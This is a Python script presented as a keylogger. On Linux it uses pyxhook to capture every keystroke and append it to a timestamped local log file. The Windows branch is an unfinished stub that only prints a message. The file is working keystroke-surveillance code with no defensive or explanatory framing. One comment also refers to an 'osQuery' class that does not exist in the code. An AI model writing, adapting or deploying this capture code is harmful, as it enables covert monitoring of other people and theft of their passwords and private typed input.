#!/usr/bin/python

import os
from datetime import datetime
import pyxhook
import platform

# Function for Linux-based OS
def linuxKeylogger():
    # Create log file
    log = f"{datetime.now().strftime("%d-%m-%Y|%H:%M")}.log"

    def OnKeyPress(event):

        # Open log file and append key presses
        with open(log, "a") as f:
            # If 'Enter' key is pressed, replace with newline
            if event.Key == "P_Enter":
                f.write('\n')
            else:
                # Append key presses to file and convert ascii to readable characters
                f.write(f"{chr(event.Ascii)}")

    hook = pyxhook.HookManager()
    hook.KeyDown = OnKeyPress
    hook.HookKeyboard()

    try:
        hook.start()
    except KeyboardInterrupt:
        # Exit program
        hook.cancel()
        pass
    except Exception as ex:
        msg = f"Error while catching events:\n {ex}"
        pyxhook.print_err(msg)
        with open(log, "a") as f:
            f.write(f"\n{msg}")

# Function for Windows-based OS
def winKeylogger():
     
    print("Run Windows keylogger...")


def main():
    # Create object for 'osQuery' class and run it to determine OS
    OS = platform.system()
    print(f"{OS}")

    # Match case to run OS-dependant function
    match OS:
        case "Linux": linuxKeylogger() # Call Linux-based keylogger
        case 'Windows': winKeylogger() # Call Windows-based keylogger
        case _: return "OS is not 'Windows' or 'Linux'."

if __name__ == "__main__":
    main()